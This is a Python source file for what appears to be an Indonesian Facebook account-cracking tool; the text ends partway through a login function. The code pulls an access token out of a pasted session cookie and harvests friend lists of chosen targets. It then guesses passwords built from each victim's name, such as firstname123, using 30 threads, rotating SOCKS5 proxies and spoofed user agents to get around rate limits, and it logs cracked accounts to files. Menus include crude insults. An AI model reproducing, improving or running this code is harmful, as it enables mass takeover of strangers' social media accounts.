#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich import print as cetak
from rich.panel import Panel as nel
from rich import pretty
from rich.syntax import Syntax
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn,TransferSpeedColumn,DownloadColumn
from rich.console import Console
from rich.columns import Columns
from time import time as cok
pretty.install()
CON=sol()
## RANDOM UA

#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
tod=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m�\x1b[1;97m] [\x1b[1;96mhasim_ganz...')
prox=open('.prox.txt','r').read().splitlines()
for x in range(500):
	rr = random.randint
	rc = random.choice
	az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	aZ = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
	a = ['2.3.6;','4.0.4;','4.2.1;','4.2','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0;','7.0.1;','7;','8;','8.0;','8.0.1;','9;','10;','11;','12;']
	b = ['zh-cn;','en-nz;','vi-vn;','hi-in;','en-us;','id-id;','en-gb;','ru-ru;','jap-jap;','en-ca;','es-mx;','zh-tw;','ko-kr;','th-th;','en-in;','el-gr;','tr-tr;','fr-fr;','en-ez;','zh-hk;','ar-ae;','ru-ru;','zh-CN;en-US;','fr-ch;','pt-br;','nl-nl;','gu-in;','en_US']
	
	se = f"Mozilla/5.0 (Linux; U; Android 10; en-us; MI 8 SE Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,107))}.0.{str(rr(4200,5200))}.{str(rr(30,250))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.11.4-gn"
	if se in tod:pass
	else:tod.append(se)
#	se1 = f"Mozilla/5.0 (Linux; Android 9; KFTRPWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/{str(rr(30,107))}.{str(rr(0,9))}.{str(rr(0,20))} like Chrome/{str(rr(30,107))}.0.{str(rr(4200,5200))}.{str(rr(30,250))} Safari/537.36"
#	if se1 in tod:pass
#	else:tod.append(se1)
	
def  ua_memek():
	rr = random.randint
	rc = random.choice
	az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	return str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,107))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} Mobile Safari/537.36"]))
def uaku():
	try:
		ua=open('ua.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\033[93m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([Z,N,O,U,B,K,H,M,P])
sir =random.choice([M])
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"
Z2 = "[#000000]" # HITAM
M2 = "[#FF005F]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

W = '\x1b[1;30m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[0;92m'
K = '\x1b[0;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
y = '\33[m'
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00C8FF"
except FileNotFoundError:
	color_table = "#00C8FF"

#BULAN
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#TAHUN
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
#--------------------[ MENU-AWAL ]--------------#
#cetak(nel(f"""[bold green]GUNAKAN SCRIPT INI SEBAIK DAN SEWAJAR MUNGKIN,ADMIN TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN TOOLS INI,TERIMA KASIH[/]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]PESAN [bold red]• [yellow]• [bold green]•",style=f"yellow"))
#tree = Tree(f" [[cyan]![/]] [bold green]TUNGGU BEBERAPA SAAT UNTUK MASUK KE DALAM MENU")
#cetak(tree)
#time.sleep(0.5)
#os.system('clear')
#------------------[ MACHINE-SUPPORT ]---------------#
def YOTTAGANZZ(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
        
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	cetak(nel(f"""[bold white]
[blue]  _____      _                 
[blue] |  __ \    | |                
[blue] | |__) |___| |__   ___  _ __         VERSION : 1.2.7
[blue] |  _  // _ \ '_ \ / _ \| '_ \ 
[red] | | \ \  __/ |_) | (_) | | | |
[red] |_|  \_\___|_.__/ \___/|_| |_|                      

[bold white]TOOLS [bold red]CRECKING[yellow] FACEBOOK[bold white]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGO BANNER [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]Version [bold green]0.1[/] [bold red]• [yellow]• [bold green]•",style=f"bold blue"))
	
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# KESALAHAN PADA KONEKSI, COBA JALANKAN ULANG'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	os.system('clear')
	banner()
	warna = random.choice([
 P, M, H, K, B, U, O, N])
	cetak(nel(f"[bold green]YOTTA GANTENG [bold yellow]MEMINTA ANDA UNTUK MEMASUKAN COOKIES KARENA GAK ADA COOKIES GAK BISA LOGIN ANJIM",style="blue bold",title="[bold red]•[bold yellow]•[bold green]•[bold red] informasi [bold green]•[bold yellow]•[bold red]•"))
	cookie=input(f'  [{H}•{x}] Masukkan Cookie :{warna} ')
	if cookie in ['open','Open','OPEN']:
		os.system('xdg-open https://youtu.be/VDn-k4t5IBw')
	loading()
	try:
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 9; Mito A67) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'	{x}[{H}•{x}]{H} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'	%s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,K,x,M,x))
		exit()

def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	banner()
#	cetak(nel(f"[green]SCRIPT MADE IN INDONESIA RECODER BY : YOTTAKUN\nSETASTUS SCRIPT :[yellow] PIVATE\nSCRIPT INI HANYA UNTUK PRIBADI HOOH TENAN!!!",style="bold cyan",title="[bold green]• [bold yellow]• [bold red]• [bold white]WELL COME TO CRECKER INDONESIA[/] [bold red]• [yellow]• [bold green]•",subtitle="[bold green]• [bold yellow]• [bold red]• [bold cyan]•••>_<••• [bold red]• [yellow]• [bold green]•"))
	cetak(nel(f"NAMA PENGGUNA[bold white] : [bold blue]{my_name}\n[bold yellow]HARI      [bold white]    :[bold yellow] {str(tgl)+'-'+str(bln)+'-'+str(thn)}",style="bold blue",title="[bold green]• [bold yellow]• [bold red]• [bold white]INFO USER[/] [bold red]• [yellow]• [bold green]•",subtitle="[bold green]• [bold yellow]• [bold red]• [bold white]•••>_<••• [bold red]• [yellow]• [bold green]•"))
	tree = Tree(nel(f"[bold green]CRECK PUBLIC",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.1 [/][bold red]• [yellow]• [bold green]•"),guide_style="bold blue")
	tree.add(nel(f"[bold green]CRECK MASSAL",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.2 [/][bold red]• [yellow]• [bold green]•")).add(nel(f"[bold green]CEK RESULT",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.3 [/][bold red]• [yellow]• [bold green]•")).add(nel(f"[bold green]CRECK RESULT CP [bold red]OFF",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.4 [/][bold red]• [yellow]• [bold green]•"))
	tree.add(nel(f"[bold green]KELUAR",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.0 [/][bold red]• [yellow]• [bold green]•"))
	cetak(tree)
	_______YOTTA_______ = input('['+p+'PILIH'+x+'] : ')
	print('')
	if _______YOTTA_______ in ['1']:
		publik()
	elif _______YOTTA_______ in ['2']:
		dump_massal()
	elif _______YOTTA_______ in ['3']:
	  result()
	elif _______YOTTA_______ in ['4']:
		clon_email()
	elif _______YOTTA_______ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('['+p+'LOG OUT SUCCSES REMOVE COOKIES'+x+'] ')
		exit()
	else:
		print('['+p+'PILIH YANG BENER KONTOL'+x+'] ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	tree = Tree(nel(f"[bold green]CECK RESULT CP",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.1 [/][bold red]• [yellow]• [bold green]•"),guide_style="bold blue")
	tree.add(nel(f"[bold green]CECK RESULT OK",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.2 [/][bold red]• [yellow]• [bold green]•"))
	tree.add(nel(f"[bold green]KEMBALI",style="bold cyan",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]NO.0 [/][bold red]• [yellow]• [bold green]•"))
	cetak(tree)
	kz = input('\n╰─ Chouse : ')
	print('')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('╰─ File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('╰─ Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
			geeh = input('\n╰─ Chouse : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				print('╰─ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('╰─ File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'╰─CP\033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			input('\n╰─ Back Enter ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('╰─ File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('╰─ Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input('\n╰─ Chouse : ')
			try:geh = lol[geeh]
			except KeyError:
				print('╰─ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('╰─ File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'\n╰─OK\033[32m {cpkuni[0]}|{cpkuni[1]}|\033[32m{cpkuni[2]}\033[0m')
				nocp +=1
			input('\n╰─ Back Enter ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('╰─ Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def publik():
	cok = open(".cok.txt","r").read()
	token = open(".token.txt","r").read()
	coki = {"cookie":cok}
	ses=requests.Session()
	cetak(nel(f"ENTE KADANG KADANG ENTE!!",style="bold blue",title="[bold green] [bold red]•[bold yellow]•[bold green]•[bold red]MASUKAN TARGET [bold green]•[bold yellow]•[bold red]•[/bold green]"))
	akun = input(f"[{M}!{P}] Target : {H}")
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.limit(10000)&access_token={token}',cookies = {'cookies':cok}).json()
		for pi in bas['friends']['data']:
			try:
				id.append(pi['id']+"|"+pi['name'])
				print(f'\r{P}[{M}!{P}] Total  : {H}%s'%(len(id)),end=" ")
				time.sleep(0.0001)
			except:continue
		print("\r")
		print(f'{x}')
		setting()
	except (KeyError,IOError):
		print("")
		print(f"Akun Tidak Publik")
		input(f"Enter Untuk Kembali Ke Menu")
		time.sleep(1)
		back()

#-------------------[ CRACK-MASSAL ]----------------#
def dump_massal():
	cetak(nel(f"ENTE KADANG KADANG ENTE!!",style="bold blue",title="[bold green] [bold red]•[bold yellow]•[bold green]•[bold red]MASUKAN TARGET [bold green]•[bold yellow]•[bold red]•[/bold green]"))
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('╰─> Mαυ Bҽɾαρα Tαɾɠҽƚ Wαƙ ? : '))
	except ValueError:
		print('╰─> wrong input ')
		exit()
	if jum<1 or jum>100:
		print('╰─> Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('╰─> Enter the Id Wak'+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('╰─> unstable signal ')
			exit()
	try:
		print('')
		print(f'╰─> Total Id Collected {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('╰─> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'╰─>{k} Friendship Not Public {x}')
		time.sleep(1)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel(f"",style="bold blue",title="[bold green] [bold red]•[bold yellow]•[bold green]•[bold red]PILIH URUTAN TARGET [bold green]•[bold yellow]•[bold red]•[/bold green]"))
	tree = Tree(nel(f"[bold red]CRACK DARI ID TERTUA",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.1 [/][bold red]• [yellow]• [bold green]•"),guide_style="bold blue")
	tree.add(nel(f"[bold green]CRACK DARI ID TERMUDA",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.2 [/][bold red]• [yellow]• [bold green]•"))
	tree.add(nel(f"[bold yellow]CRACK DARI ID RANDOM",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.3 [/][bold red]• [yellow]• [bold green]•"))
	cetak(tree)
	hu = input('['+p+'PILIH'+x+'] : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('['+p+'PILIH'+x+'] ')
		exit()
		print('')
		
	cetak(nel(f"",style="bold blue",title="[bold green] [bold red]•[bold yellow]•[bold green]•[bold red]PILIH LOGIN URL [bold green]•[bold yellow]•[bold red]•[/bold green]"))
	tree = Tree(nel(f"[bold green]ASYNC",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.1 [/][bold red]• [yellow]• [bold green]•"),guide_style="bold blue")
	tree.add(nel(f"[bold green]REGULER",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.2 [/][bold red]• [yellow]• [bold green]•"))
	tree.add(nel(f"[bold green]VILADATE",style="bold blue",width=25,title=f"[bold green]• [bold yellow]• [bold red]• [bold blue]NO.3 [/][bold red]• [yellow]• [bold green]•"))
	cetak(tree)
	hc = input('['+p+'PILIH'+x+'] : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')
	io = '''[bold yellow]Tambahkan password manual untuk hasil creck yang lebih memungkinkan'''

	cetak(nel(f"",style="bold blue",title="[bold green] [bold red]•[bold yellow]•[bold green]•[bold red]APAKAH INGIN MENAMBAH PASSWORD [bold green]•[bold yellow]•[bold red]•[/bold green]"))
	print('')
	pwplus=input(x+'╰─>['+p+'Yotta'+x+'] y/t : ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel(f"Enter an additional password of at least 6 characters\nExample :[green] sayang,bagong,surabaya[white]",style="bold blue",title=" [bold green] [bold red]•[bold yellow]•[bold green]•[bold red][bold blue]Informasi Password [bold green]•[bold yellow]•[bold red]•[/bold green]"))
		pwku=input('Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	

	
#----[ BAGIAN-WORDLIST ]----#
def ran():
    return str(cok()).split('.')[0]
def passwrd():
#	os.system('clear')
	global prog,des
	cetak(nel(f'[white]Results [green]OK[white] Save in : [green]OK/%s [white]'%(okc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]OK SAVE [bold red]• [yellow]• [bold green]•",style=f"bold blue"))
	cetak(nel(f'[white]Results [yellow]CP[white] Save in : [yellow]CP/%s [white]'%(cpc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]CP SAVE [bold red]• [yellow]• [bold green]•",style=f"bold blue"))
	cetak(nel(f'[bold green]Dont forget to on/off airplane mode,to avoid IP spam',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]ALERT [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]CRACK IN PROGRES [bold red]• [yellow]• [bold green]•",style=f"bold blue"))
	print('')
	
	prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn());des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crackmbasic,idf,pwv)
		print('')
		cetak('╰─ Sucses Cracked %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
		print('')
		exit()


#-------------[ METHOD VILADATE ]-------------#

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}ASYNC{x} [green]{(ok)}[/][blue]/[yellow]{(cp)} {len(id)}/[deep_white]{(loop)}[/]')
	prog.advance(des)
	ua2 = random.choice(tod)
	ua = ua_memek()
#	ua = ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3023249458 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0')
#	ua = random.choice(["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/537.36 (KHTML, like Gecko, GoogleAdSenseInfeed) Chrome/107.0.5304.115 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 1068) AppleWebKit/535.11 (KHTML like Gecko) Chrome/17.0.963.56 Safari/535.11","Mozilla/5.0 (iPhone; U; CPU iPhone OS 433 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 1064; en-us) AppleWebKit/533.17.8 (KHTML like Gecko) Version/5.0.1 Safari/533.17.8","Mozilla/5.0 (Macintosh; Intel Mac OS X 1058) AppleWebKit/535.7 (KHTML like Gecko) Chrome/16.0.912.75 Safari/535.7","Mozilla/5.0 (Macintosh; Intel Mac OS X 1073) AppleWebKit/537.22 (KHTML like Gecko) Chrome/25.0.1364.152 Safari/537.22","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:18.0) Gecko/20100101 Firefox/18.0 AlexaToolbar/amznf-3.0.20121129","Mozilla/5.0 (Macintosh; Intel Mac OS X 1084) AppleWebKit/537.74.9 (KHTML like Gecko) Version/6.1.2 Safari/537.74.9","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({				
				'Host': 'm.facebook.com',
				'upgrade-insecure-requests': '1',
				'user-agent': ua2,
